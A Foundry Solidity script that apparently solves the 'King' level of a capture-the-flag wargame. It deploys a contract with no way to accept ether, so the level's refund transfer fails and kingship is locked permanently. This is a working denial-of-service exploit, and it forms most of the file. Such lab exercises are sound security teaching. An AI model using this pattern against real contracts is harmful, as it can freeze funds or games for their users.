// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/level9/King.sol";

// Objective:
// When you submit the instance back to the level, the level is going to reclaim kingship.
// You will beat the level if you can avoid such a self proclamation.

contract Exploit {
    function exploit(address _instance) public payable {
        (bool status, ) = _instance.call{value: msg.value}("");
        require(status, "exploit failed");
    }
}

contract POC is Script {

    King king = King(payable(0x4Cf88a1E3CE85d8237909c3DdD7c2c63A866b11A));

    function run() external {
        vm.startBroadcast();

        console.log("King: ", king._king());
        uint prize = king.prize();
        console.log("Prize: ", prize);

        Exploit exploit = new Exploit();
        console.log("Exploit: ", address(exploit));

        exploit.exploit{value: prize}(address(king));
        console.log("New King: ", king._king());

        vm.stopBroadcast();

    }
}